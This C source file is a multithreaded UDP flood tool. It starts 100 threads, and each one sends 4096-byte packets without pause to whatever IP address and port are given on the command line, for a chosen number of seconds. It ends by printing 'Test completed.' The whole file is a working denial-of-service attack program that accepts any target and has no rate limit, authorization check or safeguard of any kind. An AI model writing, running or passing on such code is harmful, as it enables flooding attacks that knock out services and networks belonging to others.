#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 100
#define PACKET_SIZE 4096  // Adjust based on your server’s capabilities

typedef struct {
    char ip[16];  // Store IP as a string
    int port;
    int duration;
} thread_data_t;

void* send_powerful_traffic(void* arg) {
    thread_data_t *data = (thread_data_t *)arg;
    struct sockaddr_in server_addr;
    int sock;
    char packet[PACKET_SIZE];
    time_t start_time = time(NULL);

    // Fill the packet with random data
    memset(packet, 'A', PACKET_SIZE);

    // Setup server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);  // UDP for high-speed traffic
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Continuously send packets until the time runs out
    while (time(NULL) - start_time < data->duration) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <Port> <Duration>\n", argv[0]);
        return -1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t threads[THREAD_COUNT];
    thread_data_t thread_data[THREAD_COUNT];

    // Create multiple threads with their own data
    for (int i = 0; i < THREAD_COUNT; i++) {
        strncpy(thread_data[i].ip, ip, sizeof(thread_data[i].ip));
        thread_data[i].port = port;
        thread_data[i].duration = duration;

        if (pthread_create(&threads[i], NULL, send_powerful_traffic, &thread_data[i]) != 0) {
            perror("Thread creation failed");
            return -1;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Test completed.\n");
    return 0;
}
